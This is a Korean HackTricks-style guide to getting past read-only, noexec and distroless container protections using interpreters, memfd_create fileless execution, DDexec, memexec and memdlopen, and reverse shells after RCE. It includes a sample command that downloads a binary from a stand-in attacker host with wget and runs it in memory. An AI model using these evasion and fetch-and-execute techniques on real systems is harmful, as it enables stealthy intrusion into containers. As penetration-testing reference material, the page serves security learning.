# FS 보호 우회: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## 동영상

다음 동영상에서 이 페이지에 언급된 기법을 더 자세히 설명합니다:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - 은닉 및 회피를 위한 Linux 메모리 조작 살펴보기**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**DDexec-ng 및 메모리 내 dlopen()을 이용한 은닉 침투 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec 환경

컨테이너에서 보안 컨텍스트에 **`readOnlyRootFilesystem: true`**를 설정하면 루트 파일시스템을 read-only로 마운트할 수 있습니다.<sup>[[3]](#references)</sup> 예를 들면 다음과 같습니다.

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

루트 파일시스템이 read-only여도 별도로 마운트한 볼륨까지 read-only가 되는 것은 아닙니다. Docker는 **`/dev/shm`**을 IPC 마운트로 취급하지만, `rw` 및 `noexec`와 같은 tmpfs 옵션은 런타임 설정에 따라 달라집니다. 어느 쪽이든 의존하기 전에 대상 컨테이너의 마운트 옵션을 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> 레드팀 관점에서 이러한 조합은 이미 사용 가능한 파일이 아닌 바이너리(예: 백도어나 열거 도구)를 다운로드하고 실행하기 어렵게 만들 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

## 가장 쉬운 우회 방법: 스크립트

`noexec` 마운트는 해당 마운트에 있는 바이너리를 직접 실행하지 못하게 하지만, 인터프리터는 스크립트를 읽고 해석할 수 있습니다. 따라서 `sh` 또는 `python`이 있으면 해당 인터프리터를 통해 셸 스크립트나 Python 스크립트를 실행할 수 있습니다.<sup>[[5]](#references)</sup>

필요한 도구 자체가 바이너리인 경우에는 이 방법이 도움이 되지 않습니다.<sup>[[5]](#references)</sup>

## 메모리 우회

마운트된 경로에서 직접 실행이 차단된 경우, ELF를 메모리에 로드한 다음 메모리 내 경로를 통해 실행할 수 있습니다. 이렇게 하면 해당 마운트의 `noexec` 검사는 우회하지만, 그 밖의 커널, 권한 또는 정책상 제약까지 제거되는 것은 아닙니다.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall 우회

스크립팅 런타임에서 관련 Linux 인터페이스에 접근할 수 있다면 **`memfd_create(2)`**를 사용해 익명의 RAM 기반 파일 디스크립터를 만들고, 여기에 ELF 바이트를 기록한 뒤 fd 기반 실행 경로를 사용할 수 있습니다. [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트는 이 작업을 위한 압축된 base64 인코딩 Python, Perl 또는 Ruby 코드를 생성합니다.<sup>[[6]](#references)[[7]](#references)</sup>

현재 이 프로젝트 문서에는 Python, Perl, Ruby 대상만 나와 있습니다. PHP나 Node에는 런타임별 기법 또는 확장이 필요하므로, 특정 언어용 생성기가 없다고 해서 메모리 내 실행이 불가능한 것은 아닙니다.<sup>[[6]](#references)[[12]](#references)</sup>

익명 파일 실행, 관련 스테이징 패턴, 탐지 및 포렌식 수집에 대한 자세한 내용은 [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md)을 참고하세요.

> [!WARNING]
> **`/dev/shm`**에 기록한 일반 실행 파일은 해당 마운트의 **`noexec`** 설정을 그대로 따릅니다. 일반 파일 디스크립터를 통해 파일을 여는 것만으로 마운트 정책이 바뀌지는 않습니다.<sup>[[5]](#references)</sup>
>
> 구체적인 메모리 실행 방법은 런타임, 아키텍처, 커널 및 사용 가능한 권한에 따라 달라집니다.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)는 **`/proc/self/mem`**을 통해 실행 중인 셸 프로세스에 스테이저와 로더를 기록한 다음, 해당 코드로 제어를 넘깁니다.<sup>[[8]](#references)</sup>

이를 통해 실행 가능한 파일시스템에 바이너리를 먼저 배치하지 않고도 해당 프로세스에서 바이너리를 로드할 수 있습니다.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec**는 메모리에서 셸코드나 바이너리를 로드하고 **실행**할 수 있습니다.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

이 기법에 대한 자세한 내용은 Github를 확인하세요:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 데몬화된 DDexec 구현입니다. 데몬은 인수와 원시 프로그램 바이트가 포함된 요청을 수신하고, 각 프로그램을 로드하고 실행할 자식 프로세스를 fork한 뒤 부모 프로세스를 서버로 유지합니다.<sup>[[9]](#references)</sup>

저장소에는 [a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 **memexec를 사용해 PHP reverse shell로 바이너리를 실행하는** 예제가 포함되어 있습니다.<sup>[[9]](#references)</sup>

### Memdlopen

DDexec와 비슷한 목적으로, [**memdlopen**](https://github.com/arget13/memdlopen)은 공유 객체 또는 프로그램을 위한 fileless `dlopen()` 구현입니다. 현재 README에는 ARM64 지원이 문서화되어 있으므로 사용 전에 대상 아키텍처를 확인하세요.<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless가 실제로 무엇인지**, 어떤 경우에 유용하고 그렇지 않은지, 그리고 컨테이너에서 post-exploitation tradecraft를 어떻게 바꾸는지에 대한 자세한 설명은 다음을 확인하세요:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless란 무엇인가

Distroless 이미지는 애플리케이션과 해당 런타임 의존성만 포함합니다. 공식 이미지에는 패키지 관리자, 셸 및 일반적인 Linux 배포판에 있을 것으로 예상되는 기타 프로그램이 포함되지 않습니다.<sup>[[11]](#references)</sup>

런타임 이미지를 이러한 의존성만으로 구성하면 프로덕션 환경에 있는 소프트웨어와 스캔 및 추적해야 하는 대상의 양을 줄일 수 있습니다.<sup>[[11]](#references)</sup>

### Reverse Shell

distroless 컨테이너에서는 일반적인 셸을 위한 `sh`나 `bash`를 **찾지 못할 수 있고**, `ls`, `whoami`, `id`와 같은 흔한 유틸리티도 없을 수 있습니다.<sup>[[11]](#references)</sup>

> [!WARNING]
> 따라서 일반적인 셸 기반 reverse shell이나 유틸리티 기반 열거는 작동하지 않을 수 있습니다.<sup>[[11]](#references)</sup>

침해된 애플리케이션에 언어 런타임(예: Flask 애플리케이션의 Python 또는 Node 애플리케이션의 Node.js)이 포함되어 있다면, RCE를 통해 해당 런타임을 사용해 명령 채널을 열고 API를 통해 시스템을 검사할 수 있습니다.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 사용 가능한 스크립팅 언어의 기능을 통해 **시스템을 열거**하세요.<sup>[[12]](#references)</sup>

**read-only/no-exec** 보호가 없다면 명령 채널을 통해 쓰기 및 실행이 가능한 마운트에 바이너리를 기록하고 실행할 수 있습니다. 먼저 마운트 옵션과 권한을 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> 이러한 보호가 적용된 경우, 런타임, 커널 및 권한이 허용하는 환경에서 위의 **메모리 실행 기법**을 사용하세요.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE 취약점을 악용해 스크립팅 언어 기반 **reverse shell**을 얻고 메모리에서 바이너리를 실행하는 **예제**는 [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 확인할 수 있습니다.<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - 은닉 및 회피를 위한 Linux 메모리 조작 탐구](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng 및 메모리 내 dlopen()을 이용한 은밀한 침입 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod 또는 컨테이너의 보안 컨텍스트 구성](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
